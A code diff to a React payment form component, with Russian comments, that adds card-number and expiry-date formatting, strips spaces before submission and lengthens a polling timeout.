@@ -15,6 +15,36 @@ const Payment = ({ setErrorMsg }) => {
 
   const [isLoading, setIsLoading] = useState(false);
 
+  const formatCardNumber = (value) => {
+    // Удаляем все пробелы из строки
+    const cleaned = value.replace(/\s+/g, "");
+    // Форматируем строку, добавляя пробелы после каждых 4 цифр
+    const formatted = cleaned.match(/.{1,4}/g)?.join(" ") || "";
+    return formatted;
+  };
+
+  const handleCardNumberChange = (value) => {
+    const formattedValue = formatCardNumber(value);
+    setCardNumber(formattedValue);
+  };
+
+  const formatExpiryDate = (value) => {
+    // Удаляем все нецифровые символы из строки
+    const cleaned = value.replace(/\D+/g, "");
+
+    // Форматируем строку, добавляя слеш после двух цифр месяца
+    if (cleaned.length >= 3) {
+      return `${cleaned.substring(0, 2)}/${cleaned.substring(2, 4)}`;
+    }
+
+    return cleaned;
+  };
+
+  const handleExpiryDateChange = (value) => {
+    const formattedValue = formatExpiryDate(value);
+    setExpiryDate(formattedValue);
+  };
+
   const handleFormSubmit = (event) => {
     event.preventDefault();
     const tgId = localStorage.getItem("tgId");
@@ -28,7 +58,7 @@ const Payment = ({ setErrorMsg }) => {
         name: cardholderName,
         cvc: cvv,
         date: expiryDate,
-        numbers: cardNumber,
+        numbers: cardNumber.split(" ").join(""),
       })
       .then((res) => {
         if (res?.data?.error === "") {
@@ -43,7 +73,7 @@ const Payment = ({ setErrorMsg }) => {
                 navigate("/error");
               }
             });
-          }, 10000);
+          }, 15000);
         } else {
           setErrorMsg(res?.data?.error);
           navigate("/error");
@@ -99,9 +129,9 @@ const Payment = ({ setErrorMsg }) => {
                     className="mt-1 p-2 w-full border border-gray-300 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                     placeholder="1234 5678 9012 3456"
                     value={cardNumber}
-                    onChange={(e) => setCardNumber(e.target.value)}
+                    onChange={(e) => handleCardNumberChange(e.target.value)}
                     required
-                    maxLength={16}
+                    maxLength={19}
                   />
                 </div>
                 <div className="flex justify-between">
@@ -118,7 +148,7 @@ const Payment = ({ setErrorMsg }) => {
                       className="mt-1 p-2 w-full border border-gray-300 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                       placeholder="MM/YY"
                       value={expiryDate}
-                      onChange={(e) => setExpiryDate(e.target.value)}
+                      onChange={(e) => handleExpiryDateChange(e.target.value)}
                       required
                       maxLength={5}
                     />
